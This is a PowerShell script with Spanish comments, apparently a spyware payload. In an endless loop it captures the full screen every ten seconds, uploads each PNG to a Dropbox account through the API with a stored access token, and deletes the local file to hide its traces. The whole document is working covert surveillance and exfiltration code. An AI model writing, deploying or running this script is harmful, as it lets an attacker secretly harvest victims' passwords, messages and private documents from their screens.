
function Upload-ToDropbox {
    param (
        [string]$filePath,
        [string]$fileName,
        [string]$dropboxAccessToken
    )

    $dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
    $dropboxArgs = @{
        "Authorization" = "Bearer $dropboxAccessToken"
        "Content-Type"  = "application/octet-stream"
        "Dropbox-API-Arg" = (@{
            "path" = "/$fileName"
            "mode" = "add"
            "autorename" = $true
            "mute" = $false
            "strict_conflict" = $false
        } | ConvertTo-Json -Compress)
    }

    try {
        Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $dropboxArgs -InFile $filePath
        Write-Host "Archivo subido correctamente a Dropbox: $fileName"
    } catch {
        Write-Host "Error al subir el archivo a Dropbox: $_"
    }
}

# Bucle principal para la captura de pantallas
while ($true) {
    # Obtener información de la pantalla virtual
    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen

    # Crear un bitmap del tamaño de la pantalla virtual
    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width), 0))),([int32]([math]::round($($s.Height), 0)));
    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)

    # Crear un directorio temporal para almacenar el archivo
    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
    $filePath = "$env:TEMP\$fileName"
    $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Subir el archivo PNG a Dropbox
    Upload-ToDropbox -filePath $filePath -fileName $fileName -dropboxAccessToken $db

    # Limpieza
    Remove-Item -Path $filePath

    # Esperar 10 segundos antes de la siguiente iteración
    Start-Sleep -Seconds 10
}
